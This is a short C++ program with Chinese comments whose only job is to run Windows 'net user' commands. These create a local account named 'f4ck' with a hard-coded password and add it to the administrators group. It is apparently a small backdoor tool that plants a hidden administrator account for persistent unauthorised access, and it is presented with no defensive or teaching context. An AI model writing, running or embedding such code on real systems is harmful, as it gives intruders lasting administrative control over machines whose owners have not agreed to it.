#include <iostream>
#include <process.h>

/*
是添加一个帐号f4ck密码为f4ckf4ckf4ck的用户
*/ 
using namespace std;

int main()
{
        system("net user f4ck f4ckf4ckf4ck /ad");//添加用户f4ck 密码为 f4ckf4ckf4ck

        system("net localgroup administrators f4ck /ad ");//把户f4ck添加到管理组 
}
